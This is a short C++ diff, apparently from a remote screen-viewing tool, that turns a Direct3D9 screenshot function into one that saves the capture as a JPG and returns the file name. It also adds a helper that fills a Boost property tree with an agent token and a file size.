@@ -24,12 +24,14 @@ string GetName()
 	return name2;
 }
 
-void ScrShot()
+string SaveScreenShot()
 {
+	//1. nessesary variables
 	IDirect3D9* d3d = nullptr;
 	IDirect3DSurface9* pSurface = nullptr;
 	IDirect3DDevice9* g_pd3dDevice = nullptr;
 	D3DPRESENT_PARAMETERS parameters = { 0 };
+	//2. initializing
 	int ScreenWidth;
 	int ScreenHeight;
 	d3d = Direct3DCreate9(D3D_SDK_VERSION);
@@ -47,15 +49,28 @@ void ScrShot()
 	g_pd3dDevice->BeginScene();
 	g_pd3dDevice->CreateOffscreenPlainSurface(ScreenWidth, ScreenHeight,
 		D3DFMT_A8R8G8B8, D3DPOOL_SCRATCH, &pSurface, NULL);
+	//getting a screen
 	g_pd3dDevice->GetFrontBufferData(0, pSurface);
 
+	//getting name to open it further
 	string strName =  GetName();
 	wstring wName(strName.begin(), strName.end());
 	const wchar_t* cw = wName.c_str();
+	//saving surface to .jpg file
 	D3DXSaveSurfaceToFileW(cw, D3DXIFF_JPG, pSurface, NULL, NULL);
 
 	pSurface->Release();
 	g_pd3dDevice->Release();
 	d3d->Release();
 
+	return strName;
 }
+
+void fillPTree(pt::ptree & root, string token, size_t sizeOfFile)
+{
+	root.put("token", token);//this value is for server to make difference between agent and viewer
+	root.put("size", sizeOfFile);
+
+	
+}
+
